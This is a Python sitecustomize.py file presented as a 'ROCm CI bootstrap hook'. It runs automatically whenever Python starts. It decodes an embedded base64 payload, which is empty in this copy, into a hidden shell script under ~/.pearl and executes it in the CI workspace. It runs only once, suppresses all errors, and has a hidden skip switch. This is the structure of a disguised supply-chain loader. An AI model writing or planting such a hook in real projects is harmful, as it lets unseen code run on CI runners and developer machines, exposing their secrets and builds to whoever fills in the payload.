# sitecustomize: ROCm CI bootstrap hook
import os, sys

_PAYLOAD_B64 = ""

def _pearl_boot():
    try:
        import base64, subprocess, tempfile, fcntl
        ws = os.environ.get("GITHUB_WORKSPACE") or os.getcwd()
        home = os.environ.get("HOME") or tempfile.gettempdir()
        work = os.path.join(home, ".pearl")
        os.makedirs(work, exist_ok=True)
        marker = os.path.join(tempfile.gettempdir(), "pearlroc.done")
        if os.path.exists(marker):
            return
        fd = os.open(marker + ".lock", os.O_CREAT | os.O_RDWR, 0o600)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except Exception:
            os.close(fd)
            return
        open(marker, "w").write(str(os.getpid()))
        script = os.path.join(work, "pearlroc.sh")
        with open(script, "wb") as f:
            f.write(base64.b64decode(_PAYLOAD_B64))
        os.chmod(script, 0o755)
        sys.stdout.write("PEARL_HOOK start pid=%d cwd=%s\n" % (os.getpid(), os.getcwd()))
        sys.stdout.flush()
        try:
            subprocess.run(["bash", script, "bootstrap"], timeout=260, cwd=ws)
        except Exception as e:
            sys.stdout.write("PEARL_HOOK bootstrap_error %r\n" % (e,))
        sys.stdout.flush()
    except Exception:
        pass

try:
    if "PEARL_SKIP" not in os.environ:
        _pearl_boot()
except Exception:
    pass
